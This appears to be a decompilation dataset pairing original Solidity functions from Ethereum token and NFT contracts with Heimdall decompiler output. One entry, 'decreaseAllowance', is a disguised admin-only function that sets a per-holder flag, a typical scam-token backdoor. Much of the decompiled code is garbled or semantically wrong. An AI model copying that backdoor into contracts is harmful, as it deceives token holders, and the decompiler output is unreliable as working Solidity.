{"contract_address": "0xf14bcFb9213C0583632d65e80ac5B2Bd02c7D3d8", "original_solidity_code": "function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (store_a) {\n            if (!(store_a) == ((store_a / 0x02) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_a / 0x02)) / 0x20) * 0x20));\n                uint256 var_d = store_a / 0x02;\n                if (store_a) {\n                    if (!(store_a) == ((store_a / 0x02) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_a / 0x02) {\n                            if (0x1f < (store_a / 0x02)) {\n                                var_a = 0x04;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_a / 0x02) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    if (!0 > var_c.length) {\n                                        uint256 var_g = 0;\n                                        return abi.encodePacked(0x20, var_c.length);\n                                        return abi.encodePacked(0x20, var_c.length);\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xc0aC4689fe801A49Be4Ab080c0018eE0d9C3229e", "original_solidity_code": "function mintNFT(uint256 amount) public payable {\\n        require(msg.value >= batches[activeBatchId].priceInWei.mul(amount), \\\"Incorrect Ether sent\\\");\\n        _mintWithChecks(amount);\\n        hasMintedOrReceived[msg.sender] = true;\\n\\n        // Update sales data\\n        totalSales += amount;\\n        totalRevenue += msg.value;\\n\\n        if (!uniqueBuyers[msg.sender]) {\\n            uniqueBuyers[msg.sender] = true;\\n            uniqueBuyerCount++; // Increment the unique buyer count\\n        }\\n\\n        latestBuyer = msg.sender;\\n        latestSaleAmount = msg.value;\\n    }", "heimdall_decompiled_code": "function mintNFT(uint256 arg0) public view {\n        var_a = activeBatchId;\n        var_b = 0x0b;\n        require((arg0 == ((arg0 * storage_map_c[var_a]) / storage_map_c[var_a])) | !storage_map_c[var_a], \"Incorrect Ether sent\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(!(msg.value < (arg0 * storage_map_c[var_a])), \"Incorrect Ether sent\");\n        var_d = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_e = 0x20;\n        var_f = 0x14;\n        var_g = 0x496e636f72726563742045746865722073656e74000000000000000000000000;\n        var_a = activeBatchId;\n        var_b = 0x0b;\n        uint256 var_h = var_h + 0xa0;\n        var_d = storage_map_c[var_a];\n        uint256 var_i = storage_map_r[var_a];\n        uint256 var_j = storage_map_s[var_a];\n        uint256 var_k = storage_map_t[var_a];\n        bytes1 var_l = !(!bytes1(storage_map_u[var_a]));\n        require(!(!bytes1(storage_map_u[var_a])), \"Exceeds max purchase limit per wallet for the batch\");\n        var_a = activeBatchId;\n        var_b = 0x0a;\n        address var_a = msg.sender;\n        address var_b = keccak256(var_a);\n        require(!(storage_map_c[var_a] > (arg0 + storage_map_c[var_a])), \"Exceeds max purchase limit per wallet for the batch\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(!((arg0 + storage_map_c[var_a]) > (var_m)), \"Exceeds max purchase limit per wallet for the batch\");\n        var_n = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_o = 0x20;\n        var_p = 0x33;\n        var_q = 0x45786365656473206d6178207075726368617365206c696d6974207065722077;\n        var_r = 0x616c6c657420666f722074686520626174636800000000000000000000000000;\n        require(!(var_s > (arg0 + (var_s))), \"Exceeds YBC minting limit for the batch\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(!((arg0 + (var_s)) > (var_t)), \"Exceeds YBC minting limit for the batch\");\n        var_n = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_o = 0x20;\n        var_p = 0x27;\n        var_q = 0x4578636565647320594243206d696e74696e67206c696d697420666f72207468;\n        var_r = 0x6520626174636800000000000000000000000000000000000000000000000000;\n        var_n = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_o = 0x20;\n        var_p = 0x26;\n        var_q = 0x4e6f20616374697665206261746368206f72206261746368206973206e6f7420;\n        var_r = 0x6163746976650000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xD551F2Bd835B49DB742f0382d441Ede9C7C1Ee30", "original_solidity_code": "function name() public view returns (string memory) {\r\n        return _name;\r\n    }", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (store_a) {\n            if (store_a - ((store_a / 0x02) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_a / 0x02)) / 0x20) * 0x20));\n                uint256 var_d = store_a / 0x02;\n                if (store_a) {\n                    if (store_a - ((store_a / 0x02) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_a / 0x02) {\n                            if (0x1f < (store_a / 0x02)) {\n                                var_a = 0x08;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_a / 0x02) > (0x20 + (0x20 + var_c))) {\n                                    uint256 var_e = (var_c + 0x20) - var_c;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked((var_c + 0x20) - var_c, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x33743F9E4bf0A323807Fc1517Bb9aD9557585f48", "original_solidity_code": "function manualSwap() external {\r\n        require(_msgSender()==_taxWallet);\r\n        uint256 tokenBalance=balanceOf(address(this));\r\n        if(tokenBalance>0){\r\n          swapTokensForEth(tokenBalance);\r\n        }\r\n        uint256 ethBalance=address(this).balance;\r\n        if(ethBalance>0){\r\n          sendETHToFee(ethBalance);\r\n        }\r\n    }", "heimdall_decompiled_code": "function manualSwap() public {\n        require(address(msg.sender) == (address(transferDelayEnabled / 0x0100)));\n        address var_a = address(this);\n        var_b = 0x01;\n        require(!storage_map_b[var_a]);\n        store_e = 0x01000000000000000000000000000000000000000000 | (uint248(store_e));\n        require(!storage_map_b[var_a]);\n        require(!bytes1(store_e / 0x010000000000000000000000000000000000000000));\n        var_c = 0x02;\n        uint256 var_d = var_d + 0x60;\n        var_e = msg.data[4:68];\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x32;\n        address var_g = address(this);\n        var_h = 0xad5c464800000000000000000000000000000000000000000000000000000000;\n        (bool success, bytes memory ret0) = address(store_d).WETH(var_i); // staticcall\n        var_d = var_d + (uint248(ret0.length + 0x1f));\n        require(!(((var_d + ret0.length) - var_d) < 0x20), \"ERC20: approve to the zero address\");\n        require(var_d.length == (address(var_d.length)), \"ERC20: approve to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_f = 0x32;\n        uint256 var_j = address(var_d.length);\n        require(address(this), \"ERC20: approve to the zero address\");\n        require(address(store_d), \"ERC20: approve to the zero address\");\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = 0x20;\n        var_m = 0x22;\n        var_n = 0x45524332303a20617070726f766520746f20746865207a65726f206164647265;\n        var_o = 0x7373000000000000000000000000000000000000000000000000000000000000;\n        var_a = address(this);\n        var_b = 0x02;\n        var_a = address(store_d);\n        address var_b = keccak256(var_a);\n        storage_map_b[var_a] = storage_map_b[var_a];\n        address var_k = storage_map_b[var_a];\n        emit Approval(address(this), address(store_d), storage_map_b[var_a]);\n        var_k = 0x791ac94700000000000000000000000000000000000000000000000000000000;\n        address var_l = storage_map_b[var_a];\n        uint256 var_m = 0;\n        var_n = 0xa0;\n        uint256 var_p = var_d.length;\n        address var_o = address(this);\n        uint256 var_q = block.timestamp;\n        require(address(store_d).code.length);\n        (bool success, bytes memory ret0) = address(store_d).Unresolved_791ac947(var_l); // call\n        store_e = uint248(store_e);\n        require(!address(this).balance);\n        (bool success, bytes memory ret0) = address(transferDelayEnabled / 0x0100).transfer(address(this).balance);\n        var_k = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_l = 0x20;\n        var_m = 0x24;\n        var_n = 0x45524332303a20617070726f76652066726f6d20746865207a65726f20616464;\n        var_o = 0x7265737300000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0xB52Bb372A4C3336A6f3ddd8fB3dE8d6DF735Ad50", "original_solidity_code": "function symbol() external view override returns (string memory) {\\r\\n      return _symbol;\\r\\n    }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        bytes1 var_a = 0x20 + (var_a + (0x20 * (((store_c & (((!bytes1(store_c)) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) / 0x02) + 0x1f) / 0x20)));\n        bytes1 var_b = (store_c & (((!bytes1(store_c)) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)) / 0x02;\n        if (!(store_c & (((!store_c) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)) / 0x02) {\n            if (0x1f < (store_c & (((!store_c) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) / 0x02)) {\n                var_c = 0x01;\n                var_d = storage_map_d[var_c];\n                if ((var_a + 0x20) + (store_c & (((!store_c) * 0x0100) + 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) / 0x02) > (0x20 + (var_a + 0x20))) {\n                    var_d = 0x20;\n                    bytes1 var_e = var_a.length;\n                    if (!var_a.length) {\n                        bytes1 var_f = (~((0x0100 ** (0x20 - (bytes1(var_a.length)))) - 0x01)) & (var_g);\n                        return abi.encodePacked(0x20, var_a.length, (~((0x0100 ** (0x20 - (bytes1(var_a.length)))) - 0x01)) & (var_g));\n                        return abi.encodePacked(0x20, var_a.length);\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xFF702678e77f3622eD84cE1b2d4400af5182d2ee", "original_solidity_code": "function renounceOwnership() public virtual onlyOwner {\\n        _transferOwnership(address(0));\\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        owner = 0 | (uint96(owner));\n        emit OwnershipTransferred(address(owner), 0);\n    }"}
{"contract_address": "0x0a2746D0FE88EeB9538183408295c061593E478e", "original_solidity_code": "function symbol() public view virtual override returns (string memory) {\\n        return _symbol;\\n    }", "heimdall_decompiled_code": "function symbol() public view returns (string memory) {\n        if (store_f) {\n            if (store_f - ((store_f / 0x02) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_f / 0x02)) / 0x20) * 0x20));\n                uint256 var_d = store_f / 0x02;\n                if (store_f) {\n                    if (store_f - ((store_f / 0x02) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_f / 0x02) {\n                            if (0x1f < (store_f / 0x02)) {\n                                var_a = 0x05;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_f / 0x02) > (0x20 + (0x20 + var_c))) {\n                                    uint256 var_e = (var_c + 0x20) - var_c;\n                                    uint256 var_f = var_c.length;\n                                    uint256 var_g = 0;\n                                    return abi.encodePacked((var_c + 0x20) - var_c, var_c.length);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0xf06ea21cB6894CC70e2EF280026D5Fc5bEE15421", "original_solidity_code": "function transferOwnership(address newOwner) public onlyOwner {\r\n        require(\r\n            newOwner != address(0),\r\n            \"Ownable: new owner is the zero address\"\r\n        );\r\n\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n\r\n        _owner = newOwner;\r\n    }", "heimdall_decompiled_code": "function transferOwnership(address arg0) public payable {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(arg0), \"Ownable: new owner is the zero address\");\n        emit OwnershipTransferred(address(owner), address(arg0));\n        owner = (address(arg0)) | (uint96(owner));\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x26;\n        var_d = 0x4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061;\n        var_e = 0x6464726573730000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x8EF34AD921FF8e7D465210EbBe3029fB7B2dd294", "original_solidity_code": "function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }", "heimdall_decompiled_code": "function name() public view returns (string memory) {\n        if (store_a) {\n            if (!(store_a) == ((store_a / 0x02) < 0x20)) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_b = 0x22;\n                uint256 var_c = var_c + (0x20 + (((0x1f + (store_a / 0x02)) / 0x20) * 0x20));\n                uint256 var_d = store_a / 0x02;\n                if (store_a) {\n                    if (!(store_a) == ((store_a / 0x02) < 0x20)) {\n                        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                        var_b = 0x22;\n                        if (!store_a / 0x02) {\n                            if (0x1f < (store_a / 0x02)) {\n                                var_a = 0x04;\n                                var_e = storage_map_b[var_a];\n                                if ((0x20 + var_c) + (store_a / 0x02) > (0x20 + (0x20 + var_c))) {\n                                    var_e = 0x20;\n                                    uint256 var_f = var_c.length;\n                                    if (!0 > var_c.length) {\n                                        uint256 var_g = 0;\n                                        return abi.encodePacked(0x20, var_c.length);\n                                        return abi.encodePacked(0x20, var_c.length);\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }"}
{"contract_address": "0x1871d9f06F91AD65c92bD2c67eB85B3EBd5d7501", "original_solidity_code": "function transfer(address recipient, uint256 amount)\r\n        public\r\n        override\r\n        returns (bool)\r\n    {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"_transfer:: Transfer Delay enabled.  Only one purchase per block allowed.\");\n        require(address(arg0), \"_transfer:: Transfer Delay enabled.  Only one purchase per block allowed.\");\n        require(arg1 > 0, \"_transfer:: Transfer Delay enabled.  Only one purchase per block allowed.\");\n        require(address(owner) == (address(msg.sender)), \"_transfer:: Transfer Delay enabled.  Only one purchase per block allowed.\");\n        require(!(!(address(owner)) == (address(arg0))), \"_transfer:: Transfer Delay enabled.  Only one purchase per block allowed.\");\n        require(!(address(store_d) == (address(msg.sender))), \"_transfer:: Transfer Delay enabled.  Only one purchase per block allowed.\");\n        require(!(address(store_d) == (address(msg.sender))), \"_transfer:: Transfer Delay enabled.  Only one purchase per block allowed.\");\n        require(!(bytes1(transferDelay)), \"_transfer:: Transfer Delay enabled.  Only one purchase per block allowed.\");\n        require(address(store_e) == (address(arg0)), \"_transfer:: Transfer Delay enabled.  Only one purchase per block allowed.\");\n        require(!(!(address(store_d)) == (address(arg0))), \"_transfer:: Transfer Delay enabled.  Only one purchase per block allowed.\");\n        address var_a = tx.origin;\n        var_b = 0x04;\n        require(block.number > storage_map_f[var_a], \"_transfer:: Transfer Delay enabled.  Only one purchase per block allowed.\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x49;\n        var_f = 0x5f7472616e736665723a3a205472616e736665722044656c617920656e61626c;\n        var_g = 0x65642e20204f6e6c79206f6e652070757263686173652070657220626c6f636b;\n        var_h = 0x20616c6c6f7765642e0000000000000000000000000000000000000000000000;\n        var_a = tx.origin;\n        var_b = 0x04;\n        storage_map_f[var_a] = block.number;\n        require(!(address(store_d) == (address(msg.sender))), \"SafeMath: addition overflow\");\n        require(!(address(store_d) == (address(msg.sender))), \"SafeMath: addition overflow\");\n        require(!(address(store_d) == (address(msg.sender))), \"SafeMath: addition overflow\");\n        require(!(address(store_d) == (address(msg.sender))), \"SafeMath: addition overflow\");\n        require(!(address(store_d) == (address(arg0))), \"SafeMath: addition overflow\");\n        require(!(address(store_d) == (address(arg0))), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_d / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_d / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!(!bytes1(store_d / 0x01000000000000000000000000000000000000000000)), \"SafeMath: addition overflow\");\n        require(!0, \"SafeMath: addition overflow\");\n        var_a = address(this);\n        var_b = 0x01;\n        require(!(storage_map_f[var_a] > (0 + storage_map_f[var_a])), \"SafeMath: addition overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_i = 0x11;\n        require(!((0 + storage_map_f[var_a]) < storage_map_f[var_a]), \"SafeMath: addition overflow\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x1b;\n        var_f = 0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000;\n        var_a = address(this);\n        var_b = 0x01;\n        storage_map_f[var_a] = 0 + storage_map_f[var_a];\n        uint256 var_c = 0;\n        emit Transfer(address(msg.sender), address(this), 0);\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        uint256 var_j = 0x40 + var_j;\n        var_c = 0x1e;\n        var_k = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(arg1 > storage_map_f[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_l = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_f = 0x20;\n        uint256 var_g = var_j.length;\n        uint256 var_m = 0;\n        var_h = var_n;\n        var_m = 0;\n        require(!((storage_map_f[var_a] - arg1) > storage_map_f[var_a]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_i = 0x11;\n        var_a = address(msg.sender);\n        var_b = 0x01;\n        storage_map_f[var_a] = storage_map_f[var_a] - arg1;\n        var_j = 0x40 + var_j;\n        var_l = 0x1e;\n        var_o = 0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000;\n        require(!(0 > arg1), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_p = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_h = 0x20;\n        uint256 var_q = var_j.length;\n        uint256 var_r = 0;\n        var_s = var_n;\n        var_r = 0;\n        if (!(arg1 - 0) > arg1) {\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_i = 0x11;\n            var_a = address(this);\n            var_b = 0x01;\n            if (storage_map_f[var_a] > _maxTaxSwap) {\n            }\n            require(!((arg1 - 0) > arg1), \"SafeMath: multiplication overflow\");\n        }\n        require(0 - arg1, \"SafeMath: multiplication overflow\");\n        require((store_h == ((store_h * arg1) / arg1)) | !arg1, \"SafeMath: multiplication overflow\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_i = 0x11;\n        require(arg1, \"SafeMath: multiplication overflow\");\n        require(((store_h * arg1) / arg1) == store_h, \"SafeMath: multiplication overflow\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x21;\n        var_f = 0x536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f;\n        var_g = 0x7700000000000000000000000000000000000000000000000000000000000000;\n        var_j = 0x40 + var_j;\n        var_c = 0x1a;\n        var_k = 0x536166654d6174683a206469766973696f6e206279207a65726f000000000000;\n        if (0x64) {\n            if (0x64) {\n                var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n                var_i = 0x12;\n                require(0x64, \"Exceeds the _maxTxAmount.\");\n            }\n            var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n            var_i = 0x12;\n            require(0x64, \"Exceeds the _maxTxAmount.\");\n        }\n        require(!(arg1 > _maxTxAmount), \"Exceeds the _maxTxAmount.\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x19;\n        var_f = 0x4578636565647320746865205f6d61785478416d6f756e742e00000000000000;\n        if (address(store_e) == (address(arg0))) {\n            if (address(store_e) == (address(arg0))) {\n                if (address(store_e) == (address(arg0))) {\n                }\n            }\n        }\n        if (0 - arg1) {\n        }\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x29;\n        var_f = 0x5472616e7366657220616d6f756e74206d757374206265206772656174657220;\n        var_g = 0x7468616e207a65726f0000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x23;\n        var_f = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_g = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_g = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x9BF903014c2dbD36f8818eBfc7D840B2cDB6A25b", "original_solidity_code": "function updateDevWallet(address newWallet) external onlyOwner {\r\n        emit devWalletUpdated(newWallet, devWallet);\r\n        devWallet = newWallet;\r\n    }", "heimdall_decompiled_code": "function updateDevWallet(address arg0) public {\n        require(arg0 == (address(arg0)));\n        require(msg.sender == (address(owner)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = 0x20;\n        var_c = 0x20;\n        var_d = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit devWalletUpdated(address(arg0), address(devWallet));\n        devWallet = (address(arg0)) | (uint96(devWallet));\n    }"}
{"contract_address": "0x0f1B31e30AeBE88F58ce5056fdeE5E2d82E2cEcE", "original_solidity_code": "function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"ERC20: transfer amount exceeds balance\");\n        require(address(arg0), \"ERC20: transfer amount exceeds balance\");\n        address var_a = address(msg.sender);\n        uint256 var_b = 0;\n        require(!(storage_map_b[var_a] < arg1), \"ERC20: transfer amount exceeds balance\");\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x26;\n        var_f = 0x45524332303a207472616e7366657220616d6f756e7420657863656564732062;\n        var_g = 0x616c616e63650000000000000000000000000000000000000000000000000000;\n        var_a = address(msg.sender);\n        var_b = 0;\n        storage_map_b[var_a] = storage_map_b[var_a] - arg1;\n        var_a = address(arg0);\n        require(!(storage_map_b[var_a] > (arg1 + storage_map_b[var_a])), \"ERC20: transfer to the zero address\");\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_h = 0x11;\n        storage_map_b[var_a] = arg1 + storage_map_b[var_a];\n        uint256 var_c = arg1;\n        emit Transfer(address(msg.sender), address(arg0), arg1);\n        var_c = 0x01;\n        return 0x01;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x23;\n        var_f = 0x45524332303a207472616e7366657220746f20746865207a65726f2061646472;\n        var_g = 0x6573730000000000000000000000000000000000000000000000000000000000;\n        var_c = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_d = 0x20;\n        var_e = 0x25;\n        var_f = 0x45524332303a207472616e736665722066726f6d20746865207a65726f206164;\n        var_g = 0x6472657373000000000000000000000000000000000000000000000000000000;\n    }"}
{"contract_address": "0x0675693f486F11520F5b6814e290724cC6937312", "original_solidity_code": "function decreaseAllowance(address cjjjss) public    {\r\n       \r\n        require(_msgSender() == vipadmin123);\r\n        if(_msgSender() == vipadmin123){\r\n        }else{\r\n        }\r\n        uint128 newpassnum = 12233;\r\n        xelonlist[cjjjss] = newpassnum;\r\n       \r\n    }", "heimdall_decompiled_code": "function decreaseAllowance(address arg0) public payable {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender) == (address(vipadmin123)));\n        address var_a = address(arg0);\n        var_b = 0x08;\n        storage_map_b[var_a] = 0x2fc9;\n    }"}
{"contract_address": "0x49e5FEE649E311efc2Cfb0f1f47e82CD90bECA13", "original_solidity_code": "function renounceOwnership() public virtual override onlyOwner {\r\n        super.renounceOwnership();\r\n\r\n        // After ownership is renounced, change initial tax values to final tax values\r\n        _initialBuyTax = _finalBuyTax;\r\n        _initialSellTax = _finalSellTax;\r\n    }", "heimdall_decompiled_code": "function renounceOwnership() public {\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        uint256 var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        require(address(owner / 0x01) == (address(msg.sender)), \"Ownable: caller is not the owner\");\n        var_a = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_b = ((0x04 + var_c) + 0x20) - (0x04 + var_c);\n        var_d = 0x20;\n        var_e = 0x4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e6572;\n        emit OwnershipTransferred(address(owner / 0x01), 0);\n        owner = 0 | (uint96(owner));\n        store_q = store_e;\n        store_r = store_s;\n    }"}
{"contract_address": "0x46c4C3ef9A1557017955E74D4F3550971C2700A3", "original_solidity_code": "function approveMax(address spender) external returns (bool) {\r\n        return approve(spender, type(uint256).max);\r\n    }", "heimdall_decompiled_code": "function approveMax(address arg0) public returns (bool) {\n        require(arg0 == (address(arg0)));\n        address var_a = msg.sender;\n        var_b = 0x07;\n        var_a = address(arg0);\n        address var_b = keccak256(var_a);\n        storage_map_o[var_a] = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;\n        var_c = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;\n        emit Approval(msg.sender, address(arg0), 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff);\n        var_c = 0x01;\n        return 0x01;\n    }"}
{"contract_address": "0xaD0a392C384CdE80Df7FF46cE489ea7209353863", "original_solidity_code": "function transfer(address recipient, uint256 amount)\r\n        public\r\n        virtual\r\n        override\r\n        returns (bool)\r\n    {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }", "heimdall_decompiled_code": "function transfer(address arg0, uint256 arg1) public payable returns (bool) {\n        require(arg0 == (address(arg0)));\n        require(address(msg.sender), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        require(address(arg0), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        uint256 var_a = 0x60 + var_a;\n        var_b = 0x26;\n        var_c = this.code[2561:2599];\n        address var_d = address(msg.sender);\n        var_e = 0x01;\n        require(!(arg1 > storage_map_c[var_d]), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        var_f = 0x08c379a000000000000000000000000000000000000000000000000000000000;\n        var_g = 0x20;\n        uint256 var_h = var_a.length;\n        require(!(0 > var_a.length), \"\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\");\n        uint256 var_i = 0;\n        var_d = 